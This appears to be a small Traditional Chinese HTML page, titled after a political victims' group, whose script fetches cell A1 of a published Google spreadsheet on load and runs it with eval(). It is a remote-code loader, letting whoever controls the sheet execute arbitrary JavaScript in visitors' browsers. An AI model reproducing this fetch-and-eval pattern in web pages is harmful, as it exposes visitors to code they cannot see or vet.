<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8">
<title>伯拉罕政治受難小組</title>
</head>


<body>
     wwwwwww
     <div id="result" style="font-size: 24px; color: blue;">正在載入資料...</div>

   <script>
    // 1. 你的 Google 試算表發布連結
    const csvUrl = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vQBaBParGcI19sZLDdbP1cnl_Iv-IvA6b33XX3jFTJTSLDFvTumTyNPp-Z0b9zrQDGONRtDyxeuv21n/pub?output=csv';

    function getA1Cell() {
        // 2. 使用 fetch() 撈取資料
        fetch(csvUrl)
            .then(response => response.text()) 
            .then(csvText => {
                // 3. 切割 CSV 字串取得 A1 的純文字內容
                const rows = csvText.split('\n'); 
                const firstRow = rows[0].split(','); 
                const jsCodeString = firstRow[0]; 

                // 4. 先把程式碼字串秀在畫面上（讓你知道有抓成功）
                document.getElementById('result').innerText = "執行程式碼: " + jsCodeString;

                // ✨ 5. 執行這串從試算表抓下來的魔術字串！
                eval(jsCodeString); 
            })
            .catch(error => {
                console.error('抓取失敗:', error);
                document.getElementById('result').innerText = '抓取失敗，請檢查控制台。';
            });
    }

    // 網頁載入完成後自動執行
    window.onload = getA1Cell;
</script>

</body>
</html>
